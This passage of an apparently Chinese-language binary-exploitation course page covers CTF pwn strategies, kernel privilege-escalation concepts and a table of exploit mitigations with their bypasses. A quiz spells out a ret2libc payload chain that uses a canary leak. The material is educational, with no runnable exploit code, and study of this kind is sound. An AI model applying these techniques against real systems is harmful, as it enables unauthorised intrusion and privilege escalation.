+  <div class="il-item"><span class="il-num">01</span><div class="il-txt"><strong>第一步：資訊收集（永遠先做）</strong> — <code>file</code>（架構/32bit/64bit）、<code>checksec</code>（保護機制）、<code>strings ./vuln | grep -i flag</code>（找硬編碼字串）、<code>ltrace / strace ./vuln</code>（追蹤函式呼叫）。</div></div>
+  <div class="il-item"><span class="il-num">02</span><div class="il-txt"><strong>ret2win</strong> — 最基礎題型：程式中有個 <code>win()</code> 函式可直接 get shell，只需溢位覆蓋返回地址為其地址。無保護（或只有 NX）。用 cyclic 找偏移，p64(win_addr) 覆蓋返回地址。</div></div>
+  <div class="il-item"><span class="il-num">03</span><div class="il-txt"><strong>ret2plt / ret2libc</strong> — 有 NX 但無 ASLR（或可洩露地址）：利用 PLT/GOT 洩露 libc 基地址，再計算 system() 和 /bin/sh 地址，構造 ROP 鏈。標準兩階段：先洩露，再 get shell。</div></div>
+  <div class="il-item"><span class="il-num">04</span><div class="il-txt"><strong>Stack Canary 繞過</strong> — 有 Canary：尋找格式化字串洩露 Canary，或利用 <code>fork()</code> 暴力爆破（子進程 Canary 不變）。洩露後在 Payload 中正確填入 Canary 值，緊接 Saved RBP，再接返回地址。</div></div>
+  <div class="il-item"><span class="il-num">05</span><div class="il-txt"><strong>Heap 題型識別</strong> — 程式提供「分配/刪除/編輯/查看」操作選單（menu-driven heap）。先確認 glibc 版本（strings ./vuln | grep libc 或 ldd ./vuln），選擇對應的 Heap 攻擊技術（tcache/fastbin）。</div></div>
+  <div class="il-item"><span class="il-num">06</span><div class="il-txt"><strong>推薦練習平台</strong> — pwn.college（系統性課程，免費）、pwnable.kr / pwnable.tw（經典題目）、HackTheBox Pro Labs PWN 題、picoCTF 二進制題（入門）、CTFtime.org（追蹤最新 CTF 比賽）。</div></div>
+</div>
+</div>
+
+<!-- L5-5 Kernel Exploit 入門 -->
+<div class="cb" id="l5-5">
+<h2>Kernel Exploit 入門：LPE 技術</h2>
+<p>Kernel Exploit（核心漏洞利用）是最高難度的 Exploit 技術，成功後可從普通用戶提升到 root（Local Privilege Escalation，LPE），或在沙盒逃逸（Container Escape / Browser Sandbox Escape）場景中獲得主機權限。</p>
+
+<div class="kg">
+  <div class="kt"><div class="kt-n">核心漏洞類型</div><div class="kt-d">Race Condition（競爭條件）：DirtyPipe（CVE-2022-0847）、DirtyCow；Use-After-Free：核心中的 slab 記憶體 UAF；整數溢位：長度計算錯誤導致核心態越界讀寫；未初始化記憶體洩露：核心 Stack/Heap 洩露到用戶態（資訊洩露）。</div></div>
+  <div class="kt"><div class="kt-n">LPE 核心目標</div><div class="kt-d">目標：修改當前進程的 <code>cred</code> 結構體（uid/gid 設為 0），或覆蓋核心函式指標跳轉到提權 Shellcode。常用技術：modprobe_path 覆蓋、commit_creds(prepare_kernel_cred(0)) 提權。</div></div>
+  <div class="kt"><div class="kt-n">KPTI / SMEP / SMAP</div><div class="kt-d">KPTI（核心頁表隔離）：用戶態/核心態使用不同頁表，防止 Meltdown。SMEP（Supervisor Mode Execution Prevention）：核心態不能執行用戶態頁面代碼。SMAP：核心態不能讀寫用戶態數據。繞過：ret2usr 在 SMEP 前有效；現在需要核心 ROP。</div></div>
+  <div class="kt"><div class="kt-n">學習平台</div><div class="kt-d">pwn.college Kernel 模組（免費）、Linux Kernel Exploitation 倉庫（GitHub）、HackSys Extreme Vulnerable Driver（Windows Kernel 練習）、CTF 中的 pwn 題（kernel 類別）、LiveOverflow YouTube 系列。</div></div>
+</div>
+</div>
+
+<!-- L5-6 緩解技術全覽 -->
+<div class="cb" id="l5-6">
+<h2>漏洞利用緩解技術全覽</h2>
+<p>了解所有現代緩解技術的全貌，幫助在 Exploit 開發時快速判斷攻擊面和繞過策略。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>緩解技術</th><th>開啟條件</th><th>保護範圍</th><th>現狀 / 局限</th></tr></thead>
+    <tbody>
+      <tr><td><strong>NX / DEP</strong></td><td>CPU 硬體支援；gcc 默認開啟</td><td>防止 Stack/Heap Shellcode 執行</td><td>ROP 完全繞過；幾乎所有現代系統已啟用</td></tr>
+      <tr><td><strong>ASLR</strong></td><td>OS 層級（Linux /proc/sys/kernel/randomize_va_space=2）</td><td>隨機化 Stack/Heap/mmap 地址</td><td>資訊洩露可繞過；64-bit 熵值高（有效）；32-bit 可爆破</td></tr>
+      <tr><td><strong>Stack Canary</strong></td><td>gcc -fstack-protector-strong（默認啟用）</td><td>偵測 Stack 溢位（覆蓋返回地址前驗證）</td><td>資訊洩露可繞過；不保護非棧記憶體</td></tr>
+      <tr><td><strong>PIE</strong></td><td>gcc -fpie -pie（Ubuntu 默認啟用）</td><td>程式基地址隨機化</td><td>配合 ASLR 有效；資訊洩露可繞過；CTF 常關閉用於練習</td></tr>
+      <tr><td><strong>RELRO</strong></td><td>Full RELRO（gcc -Wl,-z,relro,-z,now）</td><td>GOT 唯讀（防止 GOT 改寫攻擊）</td><td>Full RELRO 有效；Partial RELRO 仍有攻擊面；現代 Linux 默認 Partial</td></tr>
+      <tr><td><strong>Safe-Linking</strong></td><td>glibc 2.32+</td><td>tcache/fastbin fd 指標加密（位移 XOR）</td><td>需要洩露 Heap 地址才能計算正確指標；部分場景仍可繞過</td></tr>
+      <tr><td><strong>Shadow Stack（CET）</strong></td><td>Intel CET 硬體；glibc 2.34+ / Ubuntu 22.04+</td><td>硬體維護 Shadow Stack，ret 指令驗證返回地址</td><td>幾乎完全防止 ROP；需要 JOP（Jump-Oriented Programming）替代</td></tr>
+      <tr><td><strong>CFI / CFG</strong></td><td>Clang CFI；Windows CFG（Control Flow Guard）</td><td>限制間接呼叫目標（只能跳轉到合法函式）</td><td>精細 CFI 有效；粗粒度（如 CFG）仍有 JOP 繞過空間</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
+  <div class="q-q">一個 CTF PWN 題目，checksec 輸出如下：<br><code>Arch: amd64-64-little | RELRO: Partial | Stack: Canary found | NX: enabled | PIE: No PIE</code><br>你找到一個格式化字串漏洞，並確認溢位偏移為 72 bytes。以下哪個攻擊路線是正確且完整的？</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>直接注入 Shellcode + 覆蓋返回地址為 Stack 地址（NX 開啟，Shellcode 無法執行）</div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">B</span>用格式化字串洩露 Canary 和 libc 地址，再 ROP 呼叫 system("/bin/sh")，Payload 中包含正確的 Canary 值</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">C</span>PIE 未開啟，所以可以直接硬編碼程式地址爆破 ASLR（ASLR 仍對 libc/Stack 生效）</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>直接覆蓋返回地址為 win() 地址（Canary 保護存在，未保留原值將 abort）</div>
+  </div>
+  <div class="q-exp">正確！這道題有三個需要處理的保護：NX（不能用 Shellcode）、Canary（覆蓋返回地址前必須保留原值）、ASLR（libc 地址隨機化，需要洩露）。完整解題路線：（1）利用格式化字串漏洞（%N$016lx）洩露 Stack 上的 Canary 值和 libc 返回地址；（2）計算 libc 基地址和 system()/"/bin/sh" 的真實地址；（3）構造 Payload：72 bytes 填充 + 正確的 Canary + 8 bytes Saved RBP + pop_rdi gadget + /bin/sh + ret gadget + system()。No PIE 意味著程式本身的地址固定，方便找到 pop rdi gadget。</div>
+</div>
+
+<div class="done-banner">
+  <h3>Stage 09 完成：漏洞研究與漏洞利用開發</h3>
+  <p>你已掌握完整的二進制安全技術棧：x86-64 架構與 GDB 調試、Stack/Heap 溢位攻擊原理、ROP 鏈構建、格式化字串漏洞、AFL++ 模糊測試、CodeQL 靜態分析、Patch Diffing 1-day 分析，以及所有現代緩解機制。恭喜你完成整個 SEC_TRACK 課程！</p>
+  <div class="btn-row">
+    <a href="index.html" class="btn-p">返回課程首頁</a>
+    <a href="stage8.html" class="btn-g">回顧第八階段</a>
+  </div>
+</div>
+</div><!-- /cw -->
+
+<div class="lnav">
+  <button class="lb" id="prevb" onclick="prevL()" disabled>&#8592; 上一課</button>
+  <div class="ln-mid">
+    <div class="ln-cnt" id="cnt">1 / 22</div>
+    <div class="ln-sub" id="lsub">CPU 架構：x86-64 暫存器與定址</div>
+  </div>
+  <button class="lb pri" id="nextb" onclick="nextL()">下一課 &#8594;</button>
+</div>
+</main>
+</div>
+
+<script>
+const LS=[
+  {id:'l1-1',ch:'CH1',title:'CPU 架構：x86-64 暫存器與定址',time:'30分鐘',type:'二進制基礎'},
+  {id:'l1-2',ch:'CH1',title:'記憶體佈局：Stack / Heap / BSS',time:'25分鐘',type:'記憶體模型'},
+  {id:'l1-3',ch:'CH1',title:'組合語言速讀：關鍵指令集',time:'30分鐘',type:'組合語言'},
+  {id:'l1-4',ch:'CH1',title:'GDB / pwndbg 調試環境搭建',time:'30分鐘',type:'調試工具'},
+  {id:'l2-1',ch:'CH2',title:'Stack Buffer Overflow 原理',time:'25分鐘',type:'Stack 溢位'},
+  {id:'l2-2',ch:'CH2',title:'返回地址覆蓋與 Shellcode',time:'30分鐘',type:'Shellcode'},
+  {id:'l2-3',ch:'CH2',title:'ROP（Return-Oriented Programming）',time:'35分鐘',type:'ROP'},
+  {id:'l2-4',ch:'CH2',title:'繞過 ASLR / NX / Stack Canary',time:'30分鐘',type:'繞過保護'},
+  {id:'l3-1',ch:'CH3',title:'Heap 記憶體管理：ptmalloc2 機制',time:'30分鐘',type:'Heap 基礎'},
+  {id:'l3-2',ch:'CH3',title:'Use-After-Free（UAF）漏洞',time:'25分鐘',type:'UAF'},
+  {id:'l3-3',ch:'CH3',title:'Heap Overflow 與 tcache 攻擊',time:'30分鐘',type:'tcache'},
+  {id:'l3-4',ch:'CH3',title:'Double Free 與 fastbin 攻擊',time:'25分鐘',type:'Double Free'},
+  {id:'l4-1',ch:'CH4',title:'模糊測試（Fuzzing）：AFL++ / libFuzzer',time:'30分鐘',type:'Fuzzing'},
+  {id:'l4-2',ch:'CH4',title:'靜態分析：CodeQL / Semgrep',time:'25分鐘',type:'靜態分析'},
+  {id:'l4-3',ch:'CH4',title:'漏洞披露與 CVE 流程',time:'20分鐘',type:'CVE 流程'},
+  {id:'l4-4',ch:'CH4',title:'1-day 分析：Patch Diffing',time:'25分鐘',type:'Patch Diffing'},
+  {id:'l5-1',ch:'CH5',title:'pwntools：Python Exploit 框架',time:'30分鐘',type:'pwntools'},
+  {id:'l5-2',ch:'CH5',title:'ROPgadget / pwntools ROP 鏈構建',time:'30分鐘',type:'ROP 工具鏈'},
+  {id:'l5-3',ch:'CH5',title:'格式化字串漏洞（Format String）',time:'25分鐘',type:'Format String'},
+  {id:'l5-4',ch:'CH5',title:'CTF 練習：PWN 題型策略',time:'20分鐘',type:'CTF 策略'},
+  {id:'l5-5',ch:'CH5',title:'Kernel Exploit 入門：LPE 技術',time:'25分鐘',type:'Kernel Exploit'},
+  {id:'l5-6',ch:'CH5',title:'漏洞利用緩解技術全覽',time:'20分鐘',type:'緩解技術'},
+];
+const done=new Set(JSON.parse(localStorage.getItem('s9_done')||'[]'));
+let cur=0;
+function go(id,btn){
+  document.querySelectorAll('.cb').forEach(b=>b.classList.remove('on'));
+  document.querySelectorAll('.ls-btn').forEach(b=>b.classList.remove('lact'));
+  const bl=document.getElementById(id);if(bl)bl.classList.add('on');
+  if(btn)btn.classList.add('lact');
+  cur=LS.findIndex(l=>l.id===id);syncUI();
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+function toggleCh(btn,id){
+  btn.classList.toggle('copen');
+  const l=document.getElementById(id);if(l)l.classList.toggle('lopen');
+}
+function prevL(){if(cur>0)findAndGo(LS[cur-1].id);}
+function nextL(){
+  done.add(LS[cur].id);
+  localStorage.setItem('s9_done',JSON.stringify([...done]));
+  if(cur<LS.length-1)findAndGo(LS[cur+1].id);
+}
+function findAndGo(id){
+  let btn=null;
+  document.querySelectorAll('.ls-btn').forEach(b=>{
+    if((b.getAttribute('onclick')||'').includes("'"+id+"'")){
+      btn=b;
+      const p=b.parentElement;
+      if(p&&!p.classList.contains('lopen')){
+        p.classList.add('lopen');
+        const cb=p.previousElementSibling;
+        if(cb)cb.classList.add('copen');
+      }
+    }
+  });
+  go(id,btn);
+}
+function syncUI(){
+  const l=LS[cur];if(!l)return;
+  document.getElementById('crumb').innerHTML=`STAGE 09 &gt; ${l.ch} &gt; <em>${l.title}</em>`;
+  document.getElementById('ltitle').textContent=l.title;
+  document.getElementById('chip1').textContent=l.type;
+  document.getElementById('chip2').textContent=`預計 ${l.time}`;
+  document.getElementById('cnt').textContent=`${cur+1} / ${LS.length}`;
+  document.getElementById('lsub').textContent=l.title;
+  document.getElementById('prevb').disabled=cur===0;
+  document.getElementById('nextb').disabled=cur===LS.length-1;
+  if(cur===LS.length-1)document.getElementById('nextb').textContent='課程完成';
+  else document.getElementById('nextb').innerHTML='下一課 &#8594;';
+  const pct=done.size?Math.round(done.size/LS.length*100):0;
+  document.getElementById('pct').textContent=pct+'%';
+  document.getElementById('pf').style.width=pct+'%';
+  document.querySelectorAll('.ls-btn').forEach(b=>{
+    const m=(b.getAttribute('onclick')||'').match(/'(l\d+-\d+)'/);
+    if(m&&done.has(m[1])&&!b.classList.contains('lact'))b.classList.add('ldone');
+  });
+}
+function chkQ(el,correct){
+  const box=el.closest('.quiz');
+  if(box.dataset.answered)return;
+  box.dataset.answered='1';
+  box.querySelectorAll('.qo').forEach(o=>o.style.pointerEvents='none');
+  el.classList.add(correct?'ok':'bad');
+  if(!correct)box.querySelectorAll('.qo').forEach(o=>{
+    if((o.getAttribute('onclick')||'').includes('true'))o.classList.add('ok');
+  });
+  const exp=box.querySelector('.q-exp');
+  if(exp)exp.classList.add('on');
+}
+function cpCode(btn){
+  const pre=btn.closest('.cblock').querySelector('pre');
+  navigator.clipboard.writeText(pre.innerText).then(()=>{
+    btn.textContent='已複製';setTimeout(()=>btn.textContent='複製',2000);
+  });
+}
+syncUI();
+</script>
+</body>
+</html>
